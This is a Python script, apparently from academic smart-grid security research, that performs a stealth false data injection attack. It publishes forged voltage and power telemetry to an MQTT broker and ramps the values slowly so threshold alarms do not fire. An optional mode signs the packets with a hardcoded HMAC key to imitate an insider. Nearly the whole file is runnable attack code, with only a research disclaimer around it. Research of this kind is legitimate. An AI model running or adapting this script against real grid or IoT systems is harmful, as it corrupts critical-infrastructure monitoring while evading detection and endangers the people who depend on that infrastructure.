#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  MODULE BRIEFING: attack_ramp.py — Stealth FDI Ramp / Drift Attack Simulator ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  PURPOSE:   Simulates a stealth false data injection ramp attack against    ║
║             the SmartGrid testbed. Monotonically drifts voltage and power    ║
║             measurements gradually to evade single-sample threshold alarms.  ║
║  INPUTS:    CLI arguments (duration, interval, step size, target IP)         ║
║  OUTPUTS:   Publishes ramped telemetry stream to MQTT broker                 ║
║  REQUIRES:  paho-mqtt (version 1.6+ or 2.0+)                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

RESEARCH DISCLAIMER:
    This script is for academic research and educational purposes only.
    Use ONLY on networks and devices you own and control.
    Target: Controlled lab network testbed.
"""

import argparse
import hashlib
import hmac
import json
import random
import sys
import time
from datetime import datetime

try:
    import paho.mqtt.client as mqtt
except ImportError:
    mqtt = None

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║        SmartGrid Stealth FDI Ramp / Drift Simulator          ║
║        Monotonic Gradient Injection & State Drift            ║
║        RESEARCH USE ONLY — Controlled Testbed                ║
╚══════════════════════════════════════════════════════════════╝
"""

# Default Settings
DEFAULT_TARGET_IP = "10.54.192.30"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "smartgrid/node01/telemetry"
DEFAULT_NODE_ID = "node_01"
HMAC_SECRET_KEY = "smartgrid_secret_key_2025"

def compute_hmac(payload_dict: dict, secret_key: str) -> str:
    """Computes ESP32-compliant HMAC-SHA256 signature for telemetry payload."""
    canonical = (
        f"{payload_dict['node_id']},"
        f"{payload_dict['voltage_V']:.2f},"
        f"{payload_dict['current_A']:.3f},"
        f"{payload_dict['power_W']:.2f},"
        f"{payload_dict['energy_kWh']:.3f},"
        f"{payload_dict['frequency_Hz']:.2f},"
        f"{payload_dict['power_factor']:.2f},"
        f"{payload_dict['timestamp']},"
        f"{payload_dict['seq']}"
    )
    return hmac.new(secret_key.encode('utf-8'), canonical.encode('utf-8'), hashlib.sha256).hexdigest()

def run_ramp_attack(target_ip: str, port: int, topic: str, node_id: str,
                    duration: int, interval: float, start_v: float, step_v: float,
                    max_v: float, advanced_mode: bool):
    """Executes the stealth voltage ramp injection attack."""
    print(BANNER)
    print(f"[*] Target Broker:    {target_ip}:{port}")
    print(f"[*] Target Topic:     {topic}")
    print(f"[*] Target Node ID:   {node_id}")
    print(f"[*] Starting Voltage: {start_v:.1f} V")
    print(f"[*] Ramp Gradient:    +{step_v:.2f} V every {interval:.1f}s")
    print(f"[*] Peak Voltage:     {max_v:.1f} V")
    print(f"[*] Total Duration:   {duration}s")
    print(f"[*] Advanced Mode:    {'ENABLED (Authentic HMAC Insider Threat)' if advanced_mode else 'DISABLED (Forged Payload)'}")
    print("═" * 64)

    # Check MQTT dependency
    if mqtt is None:
        print("[ERROR] paho-mqtt not installed. Run: pip install paho-mqtt")
        return

    # Initialize MQTT client
    client_id = f"ramp_attacker_{random.randint(1000, 9999)}"
    try:
        try:
            client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=client_id)
        except (AttributeError, TypeError):
            client = mqtt.Client(client_id=client_id)
        client.connect(target_ip, port, keepalive=60)
        client.loop_start()
        print(f"[+] Connected to MQTT broker at {target_ip}:{port}\n")
    except Exception as e:
        print(f"[-] Failed to connect to broker {target_ip}:{port} : {e}")
        return

    curr_voltage = start_v
    curr_seq = 2000
    start_time = time.time()
    packet_count = 0

    print(f"{'Step':<6} {'Time':<10} {'Voltage':<12} {'Drift':<10} {'Power':<10} {'Status':<16}")
    print("─" * 64)

    try:
        while (time.time() - start_time) < duration:
            packet_count += 1
            elapsed = time.time() - start_time
            curr_seq += 1
            
            # Subtle current and power variation
            curr_i = 0.44 + random.uniform(-0.01, 0.01)
            curr_pf = 0.99
            curr_p = round(curr_voltage * curr_i * curr_pf, 2)
            curr_f = 50.0 + random.uniform(-0.02, 0.02)
            drift = curr_voltage - start_v

            payload = {
                "node_id": node_id,
                "voltage_V": round(curr_voltage, 2),
                "current_A": round(curr_i, 3),
                "power_W": curr_p,
                "energy_kWh": round(15.2 + (elapsed * 0.001), 3),
                "frequency_Hz": round(curr_f, 2),
                "power_factor": curr_pf,
                "timestamp": int(time.time()),
                "seq": curr_seq,
                "rssi_dBm": -55
            }

            if advanced_mode:
                payload["hmac"] = compute_hmac(payload, HMAC_SECRET_KEY)
            else:
                payload["hmac"] = "forged_ramp_attack_invalid_hmac_0000"

            json_msg = json.dumps(payload)
            client.publish(topic, json_msg, qos=0)

            ts = datetime.now().strftime("%H:%M:%S")
            status_text = "\033[93mRAMPING DRIFT\033[0m" if drift > 0 else "NOMINAL"
            print(f"{packet_count:<6} {ts:<10} {curr_voltage:>6.2f} V     {drift:>+5.2f} V    {curr_p:>6.1f} W    {status_text}")

            # Advance ramp gradient up to ceiling
            if curr_voltage + step_v <= max_v:
                curr_voltage += step_v
            else:
                curr_voltage = max_v

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[*] Ramp attack interrupted by user.")
    finally:
        client.loop_stop()
        client.disconnect()
        total_time = time.time() - start_time
        print("\n" + "═" * 64)
        print(f"[+] Ramp attack completed: {packet_count} packets sent in {total_time:.1f}s")
        print(f"[+] Final injected voltage: {curr_voltage:.2f} V (Total drift: {curr_voltage - start_v:+.2f} V)")

def main():
    parser = argparse.ArgumentParser(description="SmartGrid Stealth FDI Ramp Attack Simulator")
    parser.add_argument("--target-ip", default=DEFAULT_TARGET_IP, help="Target broker IP (default: 10.54.192.30)")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="MQTT Broker port (default: 1883)")
    parser.add_argument("--topic", default=DEFAULT_TOPIC, help="MQTT Telemetry topic (default: smartgrid/node01/telemetry)")
    parser.add_argument("--node-id", default=DEFAULT_NODE_ID, help="Node ID (default: node_01)")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--interval", type=float, default=3.0, help="Packet injection interval (default: 3.0s)")
    parser.add_argument("--start-voltage", type=float, default=230.0, help="Starting voltage (default: 230.0V)")
    parser.add_argument("--step", type=float, default=0.8, help="Voltage drift per step (default: 0.8V)")
    parser.add_argument("--max-voltage", type=float, default=265.0, help="Ceiling voltage (default: 265.0V)")
    parser.add_argument("--advanced-mode", action="store_true", help="Compute authentic HMAC (insider threat)")
    args = parser.parse_args()

    run_ramp_attack(
        target_ip=args.target_ip,
        port=args.port,
        topic=args.topic,
        node_id=args.node_id,
        duration=args.duration,
        interval=args.interval,
        start_v=args.start_voltage,
        step_v=args.step,
        max_v=args.max_voltage,
        advanced_mode=args.advanced_mode
    )

if __name__ == "__main__":
    main()
